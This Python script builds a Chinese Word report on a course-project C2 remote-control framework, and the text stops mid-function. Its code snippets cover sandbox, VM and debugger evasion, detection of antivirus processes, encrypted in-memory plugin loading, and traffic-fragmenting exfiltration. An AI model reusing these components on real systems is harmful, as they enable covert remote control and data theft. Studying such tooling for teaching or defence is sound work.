"""
生成项目功能与核心代码分析文档
"""
from docx import Document
from docx.shared import Pt, Inches, Cm, RGBColor
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.enum.table import WD_TABLE_ALIGNMENT
from docx.oxml.ns import qn


def set_cell_shading(cell, color_hex):
    """设置单元格背景色"""
    shading = cell._element.get_or_add_tcPr()
    shd = shading.makeelement(qn('w:shd'), {
        qn('w:fill'): color_hex,
        qn('w:val'): 'clear',
    })
    shading.append(shd)


def add_heading_styled(doc, text, level=1):
    h = doc.add_heading(text, level=level)
    for run in h.runs:
        run.font.color.rgb = RGBColor(0x1A, 0x1A, 0x2E)
    return h


def add_para(doc, text, bold=False, size=11, indent=False):
    p = doc.add_paragraph()
    if indent:
        p.paragraph_format.left_indent = Cm(1)
    run = p.add_run(text)
    run.font.size = Pt(size)
    run.bold = bold
    run.font.name = 'Microsoft YaHei'
    run._element.rPr.rFonts.set(qn('w:eastAsia'), 'Microsoft YaHei')
    return p


def add_code_block(doc, text):
    """添加代码块样式的段落"""
    p = doc.add_paragraph()
    p.paragraph_format.left_indent = Cm(1)
    p.paragraph_format.space_before = Pt(4)
    p.paragraph_format.space_after = Pt(4)
    run = p.add_run(text)
    run.font.name = 'Consolas'
    run.font.size = Pt(9)
    run.font.color.rgb = RGBColor(0x2D, 0x2D, 0x2D)
    # 段落底色
    pPr = p._element.get_or_add_pPr()
    shd = pPr.makeelement(qn('w:shd'), {
        qn('w:fill'): 'F5F5F5',
        qn('w:val'): 'clear',
    })
    pPr.append(shd)
    return p


def add_table(doc, headers, rows, col_widths=None):
    """添加格式化表格"""
    table = doc.add_table(rows=1 + len(rows), cols=len(headers))
    table.style = 'Table Grid'
    table.alignment = WD_TABLE_ALIGNMENT.CENTER

    # 表头
    for i, h in enumerate(headers):
        cell = table.rows[0].cells[i]
        cell.text = h
        for p in cell.paragraphs:
            p.alignment = WD_ALIGN_PARAGRAPH.CENTER
            for run in p.runs:
                run.bold = True
                run.font.size = Pt(10)
                run.font.name = 'Microsoft YaHei'
                run._element.rPr.rFonts.set(qn('w:eastAsia'), 'Microsoft YaHei')
        set_cell_shading(cell, 'D6E4F0')

    # 数据行
    for r_idx, row_data in enumerate(rows):
        for c_idx, val in enumerate(row_data):
            cell = table.rows[r_idx + 1].cells[c_idx]
            cell.text = str(val)
            for p in cell.paragraphs:
                for run in p.runs:
                    run.font.size = Pt(9.5)
                    run.font.name = 'Microsoft YaHei'
                    run._element.rPr.rFonts.set(qn('w:eastAsia'), 'Microsoft YaHei')
        if r_idx % 2 == 1:
            for c_idx in range(len(headers)):
                set_cell_shading(table.rows[r_idx + 1].cells[c_idx], 'F2F7FB')

    if col_widths:
        for i, w in enumerate(col_widths):
            for row in table.rows:
                row.cells[i].width = Cm(w)

    doc.add_paragraph()  # 表后空行
    return table


def generate_document():
    doc = Document()

    # ── 全局默认字体 ──
    style = doc.styles['Normal']
    font = style.font
    font.name = 'Microsoft YaHei'
    font.size = Pt(11)
    style.element.rPr.rFonts.set(qn('w:eastAsia'), 'Microsoft YaHei')

    # ══════════════════════════════════════════════════════════
    # 封面
    # ══════════════════════════════════════════════════════════
    for _ in range(4):
        doc.add_paragraph()

    title = doc.add_paragraph()
    title.alignment = WD_ALIGN_PARAGRAPH.CENTER
    run = title.add_run('C2 远控框架 项目功能与核心代码分析')
    run.font.size = Pt(28)
    run.bold = True
    run.font.color.rgb = RGBColor(0x1A, 0x1A, 0x2E)
    run.font.name = 'Microsoft YaHei'
    run._element.rPr.rFonts.set(qn('w:eastAsia'), 'Microsoft YaHei')

    subtitle = doc.add_paragraph()
    subtitle.alignment = WD_ALIGN_PARAGRAPH.CENTER
    run = subtitle.add_run('网络安全编程课程设计')
    run.font.size = Pt(16)
    run.font.color.rgb = RGBColor(0x55, 0x55, 0x55)
    run.font.name = 'Microsoft YaHei'
    run._element.rPr.rFonts.set(qn('w:eastAsia'), 'Microsoft YaHei')

    doc.add_page_break()

    # ══════════════════════════════════════════════════════════
    # 目录页（手动）
    # ══════════════════════════════════════════════════════════
    add_heading_styled(doc, '目录', level=1)
    toc_items = [
        '一、项目整体架构',
        '二、加密通信引擎 — shared/crypto.py',
        '三、通信协议 — shared/protocol.py',
        '四、沙箱/VM/调试器检测 — agent/sandbox_detect.py',
        '五、WMI 环境感知 — agent/env_perception.py',
        '六、加密插件动态加载器 — agent/module_loader.py',
        '七、分片传输 — agent/frag_transfer.py',
        '八、控制端通信服务 — controller/comm_server.py',
        '九、插件打包工具 — pack_plugin.py',
        '十、插件模块详解',
        '    10.1 网络侦察插件 — recon.py',
        '    10.2 内网横向探测插件 — netprobe.py',
        '    10.3 窗口信息采集插件 — winmon.py',
        '十一、Agent 工具函数 — agent/utils.py',
        '十二、整体工作流程',
        '十三、依赖说明',
    ]
    for item in toc_items:
        add_para(doc, item, size=11)

    doc.add_page_break()

    # ══════════════════════════════════════════════════════════
    # 一、项目整体架构
    # ══════════════════════════════════════════════════════════
    add_heading_styled(doc, '一、项目整体架构', level=1)
    add_para(doc, '该项目是一个教学用途的 C2（Command & Control）远控框架，采用 Controller（控制端）+ Agent（被控端）架构，包含加密通信、沙箱检测、环境感知、插件动态加载、分片传输等功能。')

    add_code_block(doc,
        '课设2/\n'
        '├── shared/                 # 共享模块（加密引擎、通信协议）\n'
        '│   ├── crypto.py           # AES-256-GCM + RSA-2048 混合加密\n'
        '│   └── protocol.py         # C2 通信协议定义\n'
        '├── agent/                  # 被控端（Agent）\n'
        '│   ├── sandbox_detect.py   # 沙箱/VM/调试器检测\n'
        '│   ├── env_perception.py   # WMI 环境感知\n'
        '│   ├── module_loader.py    # 加密插件动态加载器\n'
        '│   ├── frag_transfer.py    # 分片传输模块\n'
        '│   ├── utils.py            # 工具函数\n'
        '│   └── plugins/            # 加密插件目录\n'
        '│       ├── recon.py        # 网络侦察插件\n'
        '│       ├── netprobe.py     # 内网横向探测插件\n'
        '│       ├── winmon.py       # 窗口信息采集插件\n'
        '│       ├── *.enc           # 加密后的插件二进制\n'
        '│       └── __enc_manifest__# 加密清单\n'
        '├── controller/             # 控制端（Controller）\n'
        '│   ├── comm_server.py      # TCP 通信服务\n'
        '│   └── utils.py            # 控制端工具函数\n'
        '├── pack_plugin.py          # 插件打包加密工具\n'
        '├── key.txt                 # AES 密钥 (hex)\n'
        '└── requirements.txt        # 依赖'
    )

    doc.add_page_break()

    # ══════════════════════════════════════════════════════════
    # 二、加密通信引擎
    # ══════════════════════════════════════════════════════════
    add_heading_styled(doc, '二、加密通信引擎 — shared/crypto.py', level=1)

    add_heading_styled(doc, '2.1 功能概述', level=2)
    add_para(doc, '实现 AES-256-GCM + RSA-2048 混合加密，是整个 C2 通信安全的核心模块。')

    add_heading_styled(doc, '2.2 核心原理', level=2)
    add_para(doc, 'RSA-2048 用于密钥交换：控制端和 Agent 各自生成 RSA 密钥对，交换公钥后，用对方公钥加密 AES 会话密钥。')
    add_para(doc, 'AES-256-GCM 用于数据加密：对称加密保证传输效率，GCM 模式同时提供机密性 + 完整性认证（防篡改）。')
    add_para(doc, '防重放攻击：每条消息带时间戳，解密时检查消息年龄（默认 5 分钟过期）。')

    add_heading_styled(doc, '2.3 核心代码详解', level=2)
    add_table(doc,
        ['功能', '文件位置', '说明'],
        [
            ['RSA 密钥生成', 'crypto.py:21-24', 'generate_rsa_keypair() 生成 2048 位 RSA 密钥对'],
            ['会话密钥加解密', 'crypto.py:54-69', '用 RSA 公钥加密/私钥解密 AES 会话密钥，采用 PKCS1_OAEP 填充'],
            ['AES-GCM 加密', 'crypto.py:73-83', '使用 AES-256-GCM 模式，返回 (nonce, ciphertext, tag) 三元组'],
            ['消息封装', 'crypto.py:96-131', '完整消息结构：header + RSA加密的会话密钥 + GCM密文 + 认证标签'],
            ['消息解密+防重放', 'crypto.py:133-153', '解密前验证时间戳，超时则拒绝'],
            ['网络序列化', 'crypto.py:156-192', '4字节长度前缀 + JSON(base64编码的二进制字段)，适合 TCP 流传输'],
        ],
        col_widths=[3.5, 3.5, 8.5]
    )

    add_heading_styled(doc, '2.4 消息格式', level=2)
    add_code_block(doc,
        '┌─────────────────────────────────────────────┐\n'
        '│ 4字节长度前缀 (struct "!I")                  │\n'
        '├─────────────────────────────────────────────┤\n'
        '│ JSON {                                       │\n'
        '│   header: {session_id, seq, timestamp, ...}  │\n'
        '│   encrypted_key: base64(RSA加密的会话密钥)    │\n'
        '│   nonce: base64(GCM随机数)                    │\n'
        '│   payload: base64(AES-GCM密文)               │\n'
        '│   tag: base64(GCM认证标签)                    │\n'
        '│ }                                            │\n'
        '└─────────────────────────────────────────────┘'
    )

    add_heading_styled(doc, '2.5 核心代码片段', level=2)
    add_para(doc, 'AES-256-GCM 加密（crypto.py:73-83）：', bold=True)
    add_code_block(doc,
        'def aes_encrypt(self, plaintext: bytes, key: bytes = None) -> tuple:\n'
        '    """AES-256-GCM 加密，返回: (nonce, ciphertext, tag)"""\n'
        '    k = key or self.session_key\n'
        '    if k is None:\n'
        '        raise ValueError("Session key not set")\n'
        '    cipher = AES.new(k, AES.MODE_GCM)\n'
        '    ciphertext, tag = cipher.encrypt_and_digest(plaintext)\n'
        '    return cipher.nonce, ciphertext, tag'
    )

    add_para(doc, '消息封装（crypto.py:96-131）：', bold=True)
    add_code_block(doc,
        'def encrypt_message(self, plaintext: bytes, session_id: str,\n'
        '                    channel: str = "tcp", msg_type: str = "cmd") -> dict:\n'
        '    if self.session_key is None:\n'
        '        self.generate_session_key()\n'
        '    nonce, ciphertext, tag = self.aes_encrypt(plaintext)\n'
        '    enc_key = self.encrypt_session_key()\n'
        '    self._seq += 1\n'
        '    header = {\n'
        '        "session_id": session_id,\n'
        '        "seq": self._seq,\n'
        '        "timestamp": time.time(),\n'
        '        "channel": channel,\n'
        '        "type": msg_type,\n'
        '    }\n'
        '    return {\n'
        '        "header": header,\n'
        '        "encrypted_key": enc_key,\n'
        '        "nonce": nonce,\n'
        '        "payload": ciphertext,\n'
        '        "tag": tag,\n'
        '    }'
    )

    add_para(doc, '消息解密与防重放（crypto.py:133-153）：', bold=True)
    add_code_block(doc,
        'def decrypt_message(self, message: dict, max_age: float = 300.0) -> bytes:\n'
        '    """解密消息，同时验证时间戳防重放，max_age 默认 5 分钟"""\n'
        '    header = message["header"]\n'
        '    age = abs(time.time() - header["timestamp"])\n'
        '    if age > max_age:\n'
        '        raise ValueError(f"Message expired (age={age:.1f}s, max={max_age}s)")\n'
        '    self.decrypt_session_key(message["encrypted_key"])\n'
        '    plaintext = self.aes_decrypt(\n'
        '        message["nonce"], message["payload"], message["tag"])\n'
        '    return plaintext'
    )

    doc.add_page_break()

    # ══════════════════════════════════════════════════════════
    # 三、通信协议
    # ══════════════════════════════════════════════════════════
    add_heading_styled(doc, '三、通信协议 — shared/protocol.py', level=1)

    add_heading_styled(doc, '3.1 功能概述', level=2)
    add_para(doc, '定义 C2 通信中所有的消息类型、通道类型和指令类型，是双方通信的"语言规范"。')

    add_heading_styled(doc, '3.2 消息类型常量', level=2)
    add_table(doc,
        ['常量名', '值', '含义'],
        [
            ['MSG_CMD', '"cmd"', '控制端发送的指令'],
            ['MSG_RESULT', '"result"', 'Agent 返回的执行结果'],
            ['MSG_HEARTBEAT', '"heartbeat"', '心跳保活'],
            ['MSG_EXFIL', '"exfil"', '数据外传'],
            ['MSG_KEY_EXCHANGE', '"key_exchange"', '密钥交换'],
            ['MSG_REGISTER', '"register"', 'Agent 注册上线'],
        ],
        col_widths=[4.5, 3.5, 7.5]
    )

    add_heading_styled(doc, '3.3 指令类型常量', level=2)
    add_table(doc,
        ['常量名', '值', '含义'],
        [
            ['CMD_EXEC', '"exec"', '执行系统命令'],
            ['CMD_DOWNLOAD', '"download"', '下载文件（Agent 到 Controller）'],
            ['CMD_UPLOAD', '"upload"', '上传文件（Controller 到 Agent）'],
            ['CMD_SYSINFO', '"sysinfo"', '获取系统信息'],
            ['CMD_MODULES', '"modules"', '列出已加载模块'],
            ['CMD_LOAD_MODULE', '"load_mod"', '加载指定模块'],
            ['CMD_RUN_MODULE', '"run_mod"', '执行已加载模块'],
            ['CMD_SHELL', '"shell"', '交互式 shell'],
            ['CMD_NETPROBE', '"netprobe"', '内网横向探测'],
            ['CMD_WINMON', '"winmon"', '窗口信息采集'],
            ['CMD_EXIT', '"exit"', '退出'],
        ],
        col_widths=[4.5, 3.5, 7.5]
    )

    add_heading_styled(doc, '3.4 核心代码片段', level=2)
    add_para(doc, '指令构建（protocol.py:51-58）：', bold=True)
    add_code_block(doc,
        'def build_command(cmd_type: str, args: dict = None) -> bytes:\n'
        '    """构建指令负载"""\n'
        '    payload = {\n'
        '        "command": cmd_type,\n'
        '        "args": args or {},\n'
        '        "timestamp": time.time(),\n'
        '    }\n'
        '    return json.dumps(payload, ensure_ascii=False).encode("utf-8")'
    )

    add_para(doc, '结果构建（protocol.py:66-74）：', bold=True)
    add_code_block(doc,
        'def build_result(status: str, data: str, error: str = None) -> bytes:\n'
        '    """构建执行结果负载"""\n'
        '    payload = {\n'
        '        "status": status,\n'
        '        "data": data,\n'
        '        "error": error,\n'
        '        "timestamp": time.time(),\n'
        '    }\n'
        '    return json.dumps(payload, ensure_ascii=False).encode("utf-8")'
    )

    add_para(doc, '密钥交换消息构建（protocol.py:91-96）：', bold=True)
    add_code_block(doc,
        'def build_key_exchange(public_key_pem: bytes) -> bytes:\n'
        '    return json.dumps({\n'
        '        "type": "key_exchange",\n'
        '        "public_key": public_key_pem.decode("utf-8"),\n'
        '    }).encode("utf-8")'
    )

    doc.add_page_break()

    # ══════════════════════════════════════════════════════════
    # 四、沙箱检测
    # ══════════════════════════════════════════════════════════
    add_heading_styled(doc, '四、沙箱/VM/调试器检测 — agent/sandbox_detect.py', level=1)

    add_heading_styled(doc, '4.1 功能概述', level=2)
    add_para(doc, '通过多种 Windows API 检测运行环境是否为沙箱、虚拟机或调试环境，用于 Agent 自我保护。若检测到高风险环境，Agent 可选择降低行为频率或终止运行。')

    add_heading_styled(doc, '4.2 检测方法详解', level=2)
    add_table(doc,
        ['检测项', '方法', '代码位置', '权重'],
        [
            ['本地调试器', 'IsDebuggerPresent() API', 'sandbox_detect.py:79-84', '3'],
            ['远程调试器', 'CheckRemoteDebuggerPresent() API', 'sandbox_detect.py:87-94', '3'],
            ['调试器进程', '遍历 tasklist 匹配 x64dbg/IDA/wireshark 等', 'sandbox_detect.py:97-109', '2'],
            ['VM 注册表', '查询 VMware/VirtualBox 注册表键', 'sandbox_detect.py:113-126', '2'],
            ['VM 进程', '匹配 vmtoolsd/VBoxService 等进程', 'sandbox_detect.py:128-139', '2'],
            ['VM MAC 地址', '检查 MAC 前缀 (00:50:56=VMware, 08:00:27=VBox)', 'sandbox_detect.py:142-157', '2'],
            ['系统运行时间', 'GetTickCount64()，沙箱通常运行<10分钟', 'sandbox_detect.py:177-183', '1'],
            ['鼠标移动', 'GetCursorInfo() 连续3次采样，位置不变则可疑', 'sandbox_detect.py:186-198', '1'],
            ['键盘活动', 'GetAsyncKeyState() 扫描虚拟键状态', 'sandbox_detect.py:200-209', '1'],
            ['磁盘容量', '总可用空间 <60GB 则可疑', 'sandbox_detect.py:160-173', '1'],
            ['桌面进程', '检测 explorer.exe 和前台窗口数量', 'sandbox_detect.py:212-225', '1'],
        ],
        col_widths=[3, 5, 4.5, 1.5]
    )

    add_heading_styled(doc, '4.3 风险评估算法', level=2)
    add_para(doc, '位于 sandbox_detect.py:231-269，run_all_checks() 方法：')
    add_code_block(doc,
        'risk_ratio = sum(检测到的项权重) / sum(所有项权重)\n'
        '>= 0.5  -> "sandbox"    （确认沙箱，高风险）\n'
        '>= 0.25 -> "suspicious" （可疑环境）\n'
        '<  0.25 -> "safe"       （安全环境）'
    )

    add_heading_styled(doc, '4.4 核心代码片段', level=2)
    add_para(doc, '调试器检测（sandbox_detect.py:79-84）：', bold=True)
    add_code_block(doc,
        'def check_debugger_present(self) -> bool:\n'
        '    """IsDebuggerPresent API 检测"""\n'
        '    try:\n'
        '        result = kernel32.IsDebuggerPresent()\n'
        '        return bool(result)\n'
        '    except Exception:\n'
        '        return False'
    )

    add_para(doc, 'VM 注册表检测（sandbox_detect.py:113-126）：', bold=True)
    add_code_block(doc,
        'def check_vm_registry(self) -> bool:\n'
        '    """通过注册表键值检测 VM"""\n'
        '    for hive, path in VM_REGISTRY_KEYS:\n'
        '        try:\n'
        '            hkey = ctypes.wintypes.HKEY()\n'
        '            ret = advapi32.RegOpenKeyExW(\n'
        '                hive, path, 0, KEY_READ, ctypes.byref(hkey))\n'
        '            if ret == 0:\n'
        '                advapi32.RegCloseKey(hkey)\n'
        '                return True\n'
        '        except Exception:\n'
        '            continue\n'
        '    return False'
    )

    add_para(doc, '鼠标移动检测（sandbox_detect.py:186-198）：', bold=True)
    add_code_block(doc,
        'def check_mouse_movement(self) -> bool:\n'
        '    """鼠标移动检测（沙箱通常无鼠标操作）"""\n'
        '    positions = []\n'
        '    for _ in range(3):\n'
        '        ci = CURSORINFO()\n'
        '        ci.cbSize = ctypes.sizeof(CURSORINFO)\n'
        '        user32.GetCursorInfo(ctypes.byref(ci))\n'
        '        positions.append((ci.ptScreenPos.x, ci.ptScreenPos.y))\n'
        '        time.sleep(0.3)\n'
        '    # 三次采样位置完全相同 -> 无人操作\n'
        '    return len(set(positions)) == 1'
    )

    doc.add_page_break()

    # ══════════════════════════════════════════════════════════
    # 五、WMI 环境感知
    # ══════════════════════════════════════════════════════════
    add_heading_styled(doc, '五、WMI 环境感知 — agent/env_perception.py', level=1)

    add_heading_styled(doc, '5.1 功能概述', level=2)
    add_para(doc, '采集主机系统信息、识别安全软件和白名单应用，构建环境画像，用于指导 Agent 的后续行为策略。')

    add_heading_styled(doc, '5.2 核心数据结构', level=2)
    add_para(doc, 'EnvProfile 数据类（env_perception.py:42-76）：')
    add_table(doc,
        ['字段', '类型', '说明'],
        [
            ['hostname', 'str', '主机名'],
            ['os_version', 'str', '操作系统版本'],
            ['arch', 'str', '系统架构'],
            ['memory_mb', 'int', '内存大小(MB)'],
            ['disk_free_gb', 'float', '磁盘剩余空间(GB)'],
            ['is_admin', 'bool', '是否管理员权限'],
            ['security_software', 'List[str]', '检测到的安全软件列表'],
            ['whitelist_software', 'List[str]', '检测到的白名单软件列表'],
            ['running_processes', 'List[str]', '所有运行中的进程名'],
        ],
        col_widths=[4, 3, 8.5]
    )

    add_heading_styled(doc, '5.3 安全软件识别库', level=2)
    add_table(doc,
        ['安全软件', '检测进程名'],
        [
            ['火绒', 'HipsTray.exe, HipsMain.exe, HipsDaemon.exe, wsctrl.exe'],
            ['360', '360tray.exe, 360sd.exe, 360safe.exe, ZhuDongFangYu.exe'],
            ['腾讯电脑管家', 'QQPCRTP.exe, QQPCTray.exe'],
            ['Windows Defender', 'MsMpEng.exe, NisSrv.exe, MpCmdRun.exe'],
            ['卡巴斯基', 'avp.exe, avpui.exe'],
            ['Norton', 'NortonSecurity.exe, ns.exe'],
            ['McAfee', 'mcshield.exe, mctray.exe'],
            ['Avast', 'AvastSvc.exe, AvastUI.exe'],
        ],
        col_widths=[4, 11.5]
    )

    add_heading_styled(doc, '5.4 白名单软件识别库', level=2)
    add_table(doc,
        ['白名单软件', '检测进程名'],
        [
            ['Outlook', 'OUTLOOK.EXE, olk.exe'],
            ['Word/Excel/PowerPoint', 'WINWORD.EXE, EXCEL.EXE, POWERPNT.EXE'],
            ['微信', 'WeChat.exe, WeChatApp.exe'],
            ['钉钉', 'DingTalk.exe, DingtalkUp.exe'],
            ['Chrome/Firefox/Edge', 'chrome.exe, firefox.exe, msedge.exe'],
            ['Teams', 'Teams.exe, ms-teams.exe'],
        ],
        col_widths=[4, 11.5]
    )

    add_heading_styled(doc, '5.5 核心代码片段', level=2)
    add_para(doc, '进程采集与软件识别（env_perception.py:176-209）：', bold=True)
    add_code_block(doc,
        'def collect_processes(self):\n'
        '    """采集进程列表并识别软件"""\n'
        '    output = subprocess.check_output(\n'
        '        "tasklist /FO CSV /NH", shell=True, timeout=10\n'
        '    ).decode("utf-8", errors="ignore")\n'
        '    for line in output.strip().split("\\n"):\n'
        '        if line:\n'
        '            parts = line.split(\'"\',\'"\')\n'
        '            if parts:\n'
        '                proc_name = parts[0].strip(\'"\').strip()\n'
        '                self.profile.running_processes.append(proc_name)\n'
        '\n'
        '    proc_lower = {p.lower() for p in self.profile.running_processes}\n'
        '\n'
        '    # 识别安全软件\n'
        '    for name, proc_list in SECURITY_SOFTWARE.items():\n'
        '        for proc in proc_list:\n'
        '            if proc.lower() in proc_lower:\n'
        '                self.profile.security_software.append(name)\n'
        '                break\n'
        '\n'
        '    # 识别白名单软件\n'
        '    for name, proc_list in WHITELIST_SOFTWARE.items():\n'
        '        for proc in proc_list:\n'
        '            if proc.lower() in proc_lower:\n'
        '                self.profile.whitelist_software.append(name)\n'
        '                break'
    )

    doc.add_page_break()

    # ══════════════════════════════════════════════════════════
    # 六、加密插件动态加载器
    # ══════════════════════════════════════════════════════════
    add_heading_styled(doc, '六、加密插件动态加载器 — agent/module_loader.py', level=1)

    add_heading_styled(doc, '6.1 功能概述', level=2)
    add_para(doc, '通过 Python 的 sys.meta_path 机制实现自定义模块加载器，从加密文件中加载插件，在内存中解密执行，不落地磁盘。这是整个插件体系的核心机制。')

    add_heading_styled(doc, '6.2 核心原理', level=2)
    add_para(doc, '打包阶段（由 pack_plugin.py 完成）：')
    add_code_block(doc,
        '.py 源码\n'
        '  → py_compile 编译为 .pyc 字节码\n'
        '  → AES-256-GCM 加密\n'
        '  → 保存为 .enc 文件'
    )
    add_para(doc, '加载阶段（由 module_loader.py 完成）：')
    add_code_block(doc,
        'import plugins.recon\n'
        '  → EncryptedModuleFinder.find_module() 拦截匹配 "plugins." 前缀\n'
        '  → 读取 recon.enc 加密文件\n'
        '  → AES-GCM 解密得到 .pyc 字节码\n'
        '  → 跳过 16 字节 .pyc 头部\n'
        '  → marshal.loads() 反序列化为 code 对象\n'
        '  → exec(code, module.__dict__) 执行'
    )

    add_heading_styled(doc, '6.3 核心代码详解', level=2)
    add_table(doc,
        ['功能', '代码位置', '说明'],
        [
            ['Finder 注册', 'module_loader.py:131-147', 'install_finder() 将自定义 Finder 插入 sys.meta_path 头部'],
            ['模块匹配', 'module_loader.py:58-65', 'find_module() 拦截以 "plugins." 为前缀的 import 请求'],
            ['加密文件解析', 'module_loader.py:82-98', '格式：[4B nonce长度][nonce][4B tag长度][tag][AES密文]'],
            ['字节码执行', 'module_loader.py:100-123', 'AES 解密→跳过 .pyc 头部→marshal.loads()→exec()'],
            ['清单加载', 'module_loader.py:31-56', '解密 __enc_manifest__ 获取可用插件列表'],
            ['直接加载', 'module_loader.py:156-193', 'load_plugin_direct() 不通过 import 机制直接加载'],
        ],
        col_widths=[3, 4, 8.5]
    )

    add_heading_styled(doc, '6.4 核心代码片段', level=2)
    add_para(doc, '模块加载核心逻辑（module_loader.py:72-123）：', bold=True)
    add_code_block(doc,
        'def load_module(self, fullname):\n'
        '    """加载并解密模块"""\n'
        '    if fullname in sys.modules:\n'
        '        return sys.modules[fullname]\n'
        '\n'
        '    module_key = fullname[len(self.prefix):]\n'
        '    enc_path = os.path.join(self.plugin_dir, f"{module_key}.enc")\n'
        '\n'
        '    # 读取加密文件\n'
        '    with open(enc_path, "rb") as f:\n'
        '        data = f.read()\n'
        '\n'
        '    # 解析: [4字节nonce长度][nonce][4字节tag长度][tag][密文]\n'
        '    # ... (省略结构解析) ...\n'
        '\n'
        '    # AES 解密得到 .pyc 字节码\n'
        '    pyc_data = self.crypto_engine.aes_decrypt(nonce, ciphertext, tag)\n'
        '\n'
        '    # 跳过 .pyc 头部 (16 bytes in Python 3.8+)\n'
        '    code = marshal.loads(pyc_data[16:])\n'
        '\n'
        '    # 创建模块对象\n'
        '    module = types.ModuleType(fullname)\n'
        '    module.__file__ = f"<encrypted:{module_key}>"\n'
        '    sys.modules[fullname] = module\n'
        '\n'
        '    # 在内存中执行字节码\n'
        '    exec(code, module.__dict__)\n'
        '    return module'
    )

    add_para(doc, 'Finder 注册（module_loader.py:131-147）：', bold=True)
    add_code_block(doc,
        'def install_finder(plugin_dir, crypto_engine, prefix="plugins."):\n'
        '    """安装加密模块 finder 到 sys.meta_path"""\n'
        '    finder = EncryptedModuleFinder(plugin_dir, crypto_engine, prefix)\n'
        '    # 移除旧的同类型 finder（避免重复注册）\n'
        '    sys.meta_path = [f for f in sys.meta_path\n'
        '                     if not isinstance(f, EncryptedModuleFinder)]\n'
        '    sys.meta_path.insert(0, finder)\n'
        '    return finder'
    )

    doc.add_page_break()

    # ══════════════════════════════════════════════════════════
    # 七、分片传输
    # ══════════════════════════════════════════════════════════
    add_heading_styled(doc, '七、分片传输 — agent/frag_transfer.py', level=1)

    add_heading_styled(doc, '7.1 功能概述', level=2)
    add_para(doc, '将大数据包分片传输，每片独立加密，规避流量监控的单包大小检测。默认分片大小 4096 字节，每片发送间隔 0.1 秒规避流量突发检测。')

    add_heading_styled(doc, '7.2 核心组件', level=2)
    add_table(doc,
        ['类名', '功能', '核心代码位置'],
        [
            ['Fragmenter', '数据分片器，按 4096 字节分片，每片带校验和', 'frag_transfer.py:18-59'],
            ['Reassembler', '数据重组器，缓存分片，到齐后拼合', 'frag_transfer.py:62-129'],
            ['FragmentedSender', '分片+加密+发送，每片间隔 0.1s', 'frag_transfer.py:132-171'],
            ['FragmentedReceiver', '接收+解密+重组，带超时机制', 'frag_transfer.py:174-211'],
        ],
        col_widths=[4, 6.5, 5]
    )

    add_heading_styled(doc, '7.3 分片格式', level=2)
    add_code_block(doc,
        '每片结构:\n'
        '┌──────────────────────────────┐\n'
        '│ 4字节元数据长度               │\n'
        '│ JSON元数据 {                  │\n'
        '│   transfer_id, chunk_index,  │\n'
        '│   total_chunks, checksum     │\n'
        '│ }                            │\n'
        '│ 实际数据 (最大 4096 字节)      │\n'
        '└──────────────────────────────┘'
    )

    add_heading_styled(doc, '7.4 核心代码片段', level=2)
    add_para(doc, '分片逻辑（frag_transfer.py:23-55）：', bold=True)
    add_code_block(doc,
        'def fragment(self, data: bytes, transfer_id: str = None) -> List[dict]:\n'
        '    if not transfer_id:\n'
        '        transfer_id = str(uuid.uuid4())[:8]\n'
        '    total_chunks = (len(data) + self.chunk_size - 1) // self.chunk_size\n'
        '    fragments = []\n'
        '    for i in range(total_chunks):\n'
        '        offset = i * self.chunk_size\n'
        '        chunk_data = data[offset:offset + self.chunk_size]\n'
        '        fragment = {\n'
        '            "transfer_id": transfer_id,\n'
        '            "chunk_index": i,\n'
        '            "total_chunks": total_chunks,\n'
        '            "chunk_size": len(chunk_data),\n'
        '            "total_size": len(data),\n'
        '            "data": chunk_data,\n'
        '            "checksum": self._checksum(chunk_data),\n'
        '        }\n'
        '        fragments.append(fragment)\n'
        '    return fragments'
    )

    add_para(doc, '重组逻辑（frag_transfer.py:68-110）：', bold=True)
    add_code_block(doc,
        'def add_fragment(self, fragment: dict) -> Optional[bytes]:\n'
        '    """添加一个分片，当所有分片到齐时返回完整数据"""\n'
        '    tid = fragment["transfer_id"]\n'
        '    idx = fragment["chunk_index"]\n'
        '    total = fragment["total_chunks"]\n'
        '    # 校验和验证\n'
        '    if checksum is not None:\n'
        '        expected = sum(data) & 0xFFFFFFFF\n'
        '        if checksum != expected:\n'
        '            raise ValueError(f"Checksum mismatch for {tid}[{idx}]")\n'
        '    # 缓存分片\n'
        '    transfer["chunks"][idx] = data\n'
        '    # 检查是否全部到齐\n'
        '    if len(transfer["chunks"]) == transfer["total_chunks"]:\n'
        '        complete = b""\n'
        '        for i in range(transfer["total_chunks"]):\n'
        '            complete += transfer["chunks"][i]\n'
        '        return complete\n'
        '    return None'
    )

    doc.add_page_break()

    # ══════════════════════════════════════════════════════════
    # 八、控制端通信服务
    # ══════════════════════════════════════════════════════════
    add_heading_styled(doc, '八、控制端通信服务 — controller/comm_server.py', level=1)

    add_heading_styled(doc, '8.1 功能概述', level=2)
    add_para(doc, 'Controller 端的 TCP 通信服务，负责管理多 Agent 连接、执行密钥交换、加密消息收发。每个 Agent 连接拥有独立的加密引擎实例，实现会话隔离。')

    add_heading_styled(doc, '8.2 核心流程', level=2)
    add_code_block(doc,
        '启动监听 (端口 9999)\n'
        '    │\n'
        '    ▼\n'
        'Agent 连接 → 为每个连接创建独立 CryptoEngine + 生成 RSA 密钥对\n'
        '    │\n'
        '    ▼\n'
        '发送控制端公钥给 Agent (_send_public_key)\n'
        '    │\n'
        '    ▼\n'
        '接收 Agent 公钥 → 加载到 crypto.peer_public_key (密钥交换完成)\n'
        '    │\n'
        '    ▼\n'
        '接收 Agent 注册信息\n'
        '    │\n'
        '    ▼\n'
        '后续通信全程 AES-256-GCM 加密'
    )

    add_heading_styled(doc, '8.3 核心代码详解', level=2)
    add_table(doc,
        ['功能', '代码位置', '说明'],
        [
            ['启动 TCP 监听', 'comm_server.py:45-54', '绑定 0.0.0.0:9999，启动 accept 线程'],
            ['接受连接', 'comm_server.py:65-104', '为每个连接创建独立 CryptoEngine，分配 session_id'],
            ['密钥交换', 'comm_server.py:108-128', '连接后立即发送 RSA 公钥给 Agent'],
            ['消息接收循环', 'comm_server.py:130-187', '处理 key_exchange/register/加密消息，超时60秒断开'],
            ['加密发送', 'comm_server.py:199-218', '用对应 Agent 的 CryptoEngine 加密后发送'],
            ['会话管理', 'comm_server.py:220-229', 'close_all_sessions() 关闭所有连接'],
        ],
        col_widths=[3, 4, 8.5]
    )

    add_heading_styled(doc, '8.4 核心代码片段', level=2)
    add_para(doc, '接受连接与独立加密引擎创建（comm_server.py:65-104）：', bold=True)
    add_code_block(doc,
        'def _accept_loop(self):\n'
        '    while self._running:\n'
